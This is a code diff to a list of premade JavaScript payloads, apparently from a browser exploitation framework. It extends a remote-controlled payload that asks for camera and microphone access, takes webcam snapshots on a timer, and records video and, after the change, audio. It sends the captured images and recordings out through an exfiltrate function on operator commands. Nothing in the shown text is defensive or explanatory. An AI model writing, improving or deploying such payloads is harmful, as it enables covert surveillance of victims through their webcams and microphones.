@@ -157,7 +157,10 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 
     async function getMediaPermissions(video = true, audio = true) {
         try {
-            if (mediaStream && mediaStream.active) return mediaStream;
+            if (mediaStream && mediaStream.active) {
+                // If a stream exists, stop its tracks before getting a new one
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
             mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
             exfiltrate('media-stream', { type: 'status', message: 'Permissions granted.' });
             return mediaStream;
@@ -175,9 +178,11 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 
         snapshotInterval = setInterval(async () => {
             try {
-                const blob = await imageCapture.takePhoto();
-                const dataUrl = await blobToDataURL(blob);
-                exfiltrate('media-stream', { type: 'image-snapshot', snapshot: dataUrl });
+                if(stream.active && stream.getVideoTracks()[0].readyState === 'live') {
+                    const blob = await imageCapture.takePhoto();
+                    const dataUrl = await blobToDataURL(blob);
+                    exfiltrate('media-stream', { type: 'image-snapshot', snapshot: dataUrl });
+                }
             } catch (e) {
                 // Ignore errors if the stream is closed
             }
@@ -205,7 +210,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
             const blob = new Blob(recordedChunks, { type: mimeType });
             const dataUrl = await blobToDataURL(blob);
             exfiltrate('media-stream', { type: mimeType, dataUrl });
-            recordedChunks = []; // Clear chunks for next recording
+            recordedChunks = [];
         };
         return recorder;
     }
@@ -213,32 +218,51 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     channel.addEventListener('message', async (event) => {
         if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
         
-        const command = event.data.command;
+        const { command } = event.data;
         
         if (command === 'start-video') {
-            const stream = await getMediaPermissions();
-            if (stream) {
-                startSnapshotting(stream);
-            }
+            const stream = await getMediaPermissions(true, true);
+            if (stream) startSnapshotting(stream);
             return;
         }
-        
-        if (!mediaStream) return; // Must have a stream for other commands
 
+        if (command === 'start-mic') {
+            await getMediaPermissions(false, true);
+            return;
+        }
+
+        if (!mediaStream || !mediaStream.active) {
+             exfiltrate('media-stream', { type: 'status', message: 'No active media stream.' });
+             return;
+        }
+        
         switch (command) {
             case 'capture-image':
-                const track = mediaStream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const blob = await imageCapture.takePhoto();
-                const dataUrl = await blobToDataURL(blob);
-                exfiltrate('media-stream', { type: 'image/png', dataUrl });
+                const videoTrack = mediaStream.getVideoTracks()[0];
+                if (videoTrack) {
+                    const imageCapture = new ImageCapture(videoTrack);
+                    const blob = await imageCapture.takePhoto();
+                    const dataUrl = await blobToDataURL(blob);
+                    exfiltrate('media-stream', { type: 'image/png', dataUrl });
+                }
                 break;
             case 'start-video-record':
-                videoRecorder = createRecorder(mediaStream, 'video/webm');
-                videoRecorder.start();
+                if (mediaStream.getVideoTracks().length > 0) {
+                    videoRecorder = createRecorder(mediaStream, 'video/webm');
+                    videoRecorder.start();
+                }
                 break;
             case 'stop-video-record':
                 if (videoRecorder) videoRecorder.stop();
+                break;
+            case 'start-audio-record':
+                 if (mediaStream.getAudioTracks().length > 0) {
+                    audioRecorder = createRecorder(mediaStream, 'audio/webm');
+                    audioRecorder.start();
+                }
+                break;
+            case 'stop-audio-record':
+                if (audioRecorder) audioRecorder.stop();
                 break;
         }
     });
